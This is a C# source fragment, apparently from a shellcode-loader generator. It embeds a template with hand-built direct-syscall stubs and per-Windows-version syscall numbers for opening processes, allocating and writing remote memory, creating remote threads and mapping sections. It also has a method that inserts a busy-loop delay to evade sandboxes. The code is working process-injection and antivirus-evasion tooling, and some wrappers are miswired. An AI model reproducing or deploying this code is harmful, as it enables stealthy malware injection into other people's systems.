            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,

            MaximumNtStatus = 0xffffffff
        }

        [DllImport(""kernel32.dll"")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport(""Kernel32.dll"", CallingConvention = CallingConvention.StdCall)]
        public static extern void GetSystemInfo(ref nativeStructs.SYSTEM_INFO lpSysInfo);

        [DllImport(""ntdll.dll"", SetLastError = true)]
        public static extern bool RtlGetVersion(ref OSVERSIONINFOEXW versionInfo);
    }

    class syscalls
    {


        public static byte[] syscallSkeleton = { 0x49, 0x89, 0xCA, 0xB8, 0xFF, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
        public static Dictionary<string, Dictionary<string, byte>> sysDic = new Dictionary<string, Dictionary<string, byte>>()
        {
            { ""win10-1507"", new Dictionary<string, byte>()
                {
                    { ""openprocess"",0x26},
                    { ""allocatevirtualmem"", 0x18},
                    { ""writevirtualmem"", 0x3A},
                    { ""createremthread"", 0xB3},
                    { ""createsection"", 0x4A },
                    { ""mapviewofsec"", 0x28 }
                }
            },
            { ""win10-1511"", new Dictionary<string, byte>()
                {
                    { ""openprocess"",0x26},
                    { ""allocatevirtualmem"", 0x18},
                    { ""writevirtualmem"", 0x3A},
                    { ""createremthread"", 0xB4},
                    { ""mapviewofsec"", 0x28 }
                }
            },
            { ""win10-1607"", new Dictionary<string, byte>()
                {
                    { ""openprocess"",0x26},
                    { ""allocatevirtualmem"", 0x18},
                    { ""writevirtualmem"", 0x3A},
                    { ""createremthread"", 0xB6},
                    { ""createsection"", 0x4A },
                    { ""mapviewofsec"", 0x28 }
                }
            },
            { ""win10-1703"", new Dictionary<string, byte>()
                {
                    { ""openprocess"",0x26},
                    { ""allocatevirtualmem"", 0x18},
                    { ""writevirtualmem"", 0x3A},
                    { ""createremthread"", 0xB9},
                    { ""createsection"", 0x4A },
                    { ""mapviewofsec"", 0x28 }
                }
            },
            { ""win10-1709"", new Dictionary<string, byte>()
                {
                    { ""openprocess"",0x26},
                    { ""allocatevirtualmem"", 0x18},
                    { ""writevirtualmem"", 0x3A},
                    { ""createremthread"", 0xBA},
                    { ""createsection"", 0x4A },
                    { ""mapviewofsec"", 0x28 }
                }
            },
            { ""win10-1803"", new Dictionary<string, byte>()
                {
                    { ""openprocess"",0x26},
                    { ""allocatevirtualmem"", 0x18},
                    { ""writevirtualmem"", 0x3A},
                    { ""createremthread"", 0xBB},
                    { ""createsection"", 0x4A },
                    { ""mapviewofsec"", 0x28 }
                }
            },
            { ""win10-1809"", new Dictionary<string, byte>()
                {
                    { ""openprocess"",0x26},
                    { ""allocatevirtualmem"", 0x18},
                    { ""writevirtualmem"", 0x3A},
                    { ""createremthread"", 0xBC},
                    { ""createsection"", 0x4A },
                    { ""mapviewofsec"", 0x28 }
                }
            },
            { ""win10-1903-9"", new Dictionary<string, byte>()
                {
                    { ""openprocess"",0x26},
                    { ""allocatevirtualmem"", 0x18},
                    { ""writevirtualmem"", 0x3A},
                    { ""createremthread"", 0xBD},
                    { ""createsection"", 0x4A },
                    { ""mapviewofsec"", 0x28 }
                }
            },
            { ""win8-12"", new Dictionary<string, byte>()
                {
                    { ""openprocess"",0x24},
                    { ""allocatevirtualmem"", 0x16},
                    { ""writevirtualmem"", 0x38},
                    { ""createremthread"", 0xAF},
                    { ""createsection"", 0x48 },
                    { ""mapviewofsec"", 0x26 }
                }
            },
            { ""win8.1-12r2"", new Dictionary<string, byte>()
                {
                    { ""openprocess"",0x25},
                    { ""allocatevirtualmem"", 0x17},
                    { ""writevirtualmem"", 0x39},
                    { ""createremthread"", 0xB0},
                    { ""createsection"", 0x49 },
                    { ""mapviewofsec"", 0x27 }
                }
            },
            { ""w7-08"", new Dictionary<string, byte>()
                {
                    { ""openprocess"",0x23},
                    { ""allocatevirtualmem"", 0x15},
                    { ""writevirtualmem"", 0x37},
                    { ""createremthread"", 0xA5},
                    { ""createsection"", 0x47 },
                    { ""mapviewofsec"", 0x25 }
                }
            }
        };

        public static nativeStructs.NTSTATUS ZwOpenProcess(ref IntPtr hProcess, nativeStructs.ProcessAccessFlags processAccess, nativeStructs.OBJECT_ATTRIBUTES objAttribute, ref nativeStructs.CLIENT_ID clientid, string os)
        { 
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os][""openprocess""];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;
                    uint oldprotect;

                    if (!nativeStructs.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.ZwOpenProcess myAssemblyFunction = (Delegates.ZwOpenProcess)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwOpenProcess));

                    return (nativeStructs.NTSTATUS)myAssemblyFunction(out hProcess, processAccess, objAttribute, ref clientid);
                }
            }
        }

        public static nativeStructs.NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, int createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os][""createremthread""];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;
                    uint oldprotect;

                    if (!nativeStructs.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out oldprotect))
                    {
                        throw new Win32Exception();
                    }
                    ////
                    ////


                    Delegates.NtCreateThreadEx myAssemblyFunction = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateThreadEx));

                    return (nativeStructs.NTSTATUS)myAssemblyFunction(out threadHandle, desiredAccess, objectAttributes, processHandle, lpStartAddress, lpParameter, createSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, lpBytesBuffer);
                }
            }
        }

        public static nativeStructs.NTSTATUS ZwWriteVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os][""writevirtualmem""];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;
                    uint oldprotect;

                    if (!nativeStructs.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.ZwWriteVirtualMemory myAssemblyFunction = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwWriteVirtualMemory));

                    return (nativeStructs.NTSTATUS)myAssemblyFunction(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
                }
            }
        }


        public static nativeStructs.NTSTATUS NtAllocateVirtualMemory(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os][""allocatevirtualmem""];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;
                    uint oldprotect;

                    if (!nativeStructs.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtAllocateVirtualMemory myAssemblyFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));

                    return (nativeStructs.NTSTATUS)myAssemblyFunction(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
                }
            }
        }

        public static nativeStructs.NTSTATUS NtCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref nativeStructs.LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os][""createsection""];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;
                    uint oldprotect;

                    if (!nativeStructs.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtCreateSection myAssemblyFunction = (Delegates.NtCreateSection)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateSection));

                    return (nativeStructs.NTSTATUS)myAssemblyFunction(ref section, desiredAccess, pAttrs, ref pMaxSize, pageProt, allocationAttribs, hFile);
                }
            }
        }

        public static nativeStructs.NTSTATUS NtMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os][""mapviewofsec""];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;
                    uint oldprotect;

                    if (!nativeStructs.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtMapViewOfSection myAssemblyFunction = (Delegates.NtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtMapViewOfSection));

                    return (nativeStructs.NTSTATUS)myAssemblyFunction(section, process, ref baseAddr, zeroBits, commitSize, stuff, ref viewSize, inheritDispo, alloctype, prot);
                }
            }
        }

        public static nativeStructs.NTSTATUS RtlGetVersion(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os][""writevirtualmem""];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;
                    uint oldprotect;

                    if (!nativeStructs.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.ZwWriteVirtualMemory myAssemblyFunction = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwWriteVirtualMemory));

                    return (nativeStructs.NTSTATUS)myAssemblyFunction(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
                }
            }
        }


        public struct Delegates
        {
            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int ZwOpenProcess(out IntPtr hProcess, nativeStructs.ProcessAccessFlags processAccess, nativeStructs.OBJECT_ATTRIBUTES objAttribute, ref nativeStructs.CLIENT_ID clientid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int ZwWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, int createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool RtlGetVersion(ref nativeStructs.OSVERSIONINFOEXW lpVersionInformation);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref nativeStructs.LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);
        }
    }
}";
        }

        public string GetCode()
        {
            //添加延时代码
            if (Global_Var.delay != 0)
            {
                string delay_temp = @"int z;
for (int j = 0; j < " + Global_Var.delay.ToString() + @"; j++)
{ for (int i = 0; i < 1000000; i++)
		{
			Random rd = new Random();
			z = rd.Next();
			z++;
		}}";
                code = code.Replace(@"//delay_code_here", delay_temp);
            }
            return code;
        }

    }
}
